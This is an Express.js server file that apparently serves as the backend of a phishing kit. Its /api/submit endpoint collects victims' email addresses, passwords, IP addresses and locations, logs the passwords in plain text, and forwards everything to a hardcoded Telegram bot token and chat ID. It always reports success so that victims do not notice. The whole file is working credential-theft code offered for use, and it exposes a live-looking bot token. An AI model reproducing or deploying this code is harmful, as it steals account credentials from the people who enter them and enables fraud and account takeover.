const express = require('express');
const cors = require('cors');
const app = express();

console.log('🚀 Starting Telegram Bot Server...');

// Configuration - UPDATE THESE WITH YOUR TELEGRAM CREDENTIALS
const CONFIG = {
  PORT: process.env.PORT || 3000,
  TELEGRAM: {
    BOT_TOKEN: '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw', // Get from @BotFather
    CHAT_ID: '5546373743'      // Your personal chat ID
  }
};

// Middleware - IMPORTANT: Allow frontend requests
app.use(cors({
  origin: '*', // Or your frontend URL like 'https://your-frontend.vercel.app'
  methods: ['GET', 'POST'],
  credentials: false
}));
app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
  console.log('✅ Health check passed');
  res.json({ 
    status: 'OK', 
    message: 'Telegram Bot Server is running',
    timestamp: new Date().toISOString()
  });
});

// Test endpoint
app.get('/api/test-telegram', async (req, res) => {
  console.log('🧪 Testing Telegram connection...');
  
  try {
    const testMessage = `🤖 BOT TEST\n\nServer is working! Time: ${new Date().toLocaleString()}`;
    
    const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM.CHAT_ID,
        text: testMessage
      })
    });

    const result = await response.json();
    
    if (result.ok) {
      console.log('✅ Telegram test successful');
      res.json({
        success: true,
        message: 'Test message sent to Telegram!',
        timestamp: new Date().toISOString()
      });
    } else {
      throw new Error(result.description || 'Telegram API error');
    }
    
  } catch (error) {
    console.error('❌ Telegram test failed:', error.message);
    res.json({
      success: false,
      error: 'Telegram not configured yet',
      message: 'Server is running but Telegram needs configuration',
      help: 'Set BOT_TOKEN and CHAT_ID in the code'
    });
  }
});

// Main endpoint - UPDATED for frontend integration
app.post('/api/submit', async (req, res) => {
  console.log('📨 Received data submission from frontend');
  
  try {
    const { 
      email,
      password,
      attempt,
      ip,
      location,
      country,
      city,
      continent,
      language,
      platform,
      userAgent
    } = req.body;

    // Basic validation
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Email and password are required'
      });
    }

    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password}`);
    console.log(`🎯 Attempt: ${attempt}`);

    // Send to Telegram if configured
    let telegramStatus = 'not_configured';
    
    if (CONFIG.TELEGRAM.BOT_TOKEN !== '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw') {
      try {
        const telegramMessage = `
🔐 NEW LOGIN ATTEMPT

📧 Email: ${email}
🔑 Password: ${password}
🎯 Attempt: ${attempt}

🌍 Location: ${location}
📍 Country: ${country}
🏙️ City: ${city}
🌐 Continent: ${continent}

💻 Platform: ${platform}
🗣️ Language: ${language}
📱 User Agent: ${userAgent?.substring(0, 50)}...
🌐 IP: ${ip}

⏰ Time: ${new Date().toLocaleString()}
        `;

        const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
        
        const telegramResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: telegramMessage
          })
        });

        const telegramResult = await telegramResponse.json();
        
        if (telegramResult.ok) {
          console.log('✅ Data sent to Telegram');
          telegramStatus = 'sent';
        } else {
          throw new Error(telegramResult.description);
        }
        
      } catch (telegramError) {
        console.log('⚠️ Telegram failed:', telegramError.message);
        telegramStatus = 'failed';
      }
    } else {
      console.log('ℹ️ Telegram not configured - data received but not sent');
    }

    // Always return success to continue the flow
    res.json({
      success: true,
      message: 'Data received successfully',
      timestamp: new Date().toISOString(),
      telegram: telegramStatus,
      data_received: {
        email: email,
        attempt: attempt,
        location: location
      }
    });

  } catch (error) {
    console.error('❌ Error:', error.message);
    
    // Still return success to not break the user flow
    res.json({
      success: true,
      message: 'Data processing completed',
      error: error.message
    });
  }
});

// Handle all other routes
app.use('*', (req, res) => {
  res.json({
    success: false,
    error: 'Route not found',
    availableRoutes: ['/api/health', '/api/test-telegram', '/api/submit']
  });
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`🎉 Server running on port ${CONFIG.PORT}`);
  console.log(`📍 Health: http://localhost:${CONFIG.PORT}/api/health`);
  console.log('💡 Configure Telegram BOT_TOKEN and CHAT_ID to enable Telegram notifications');
});

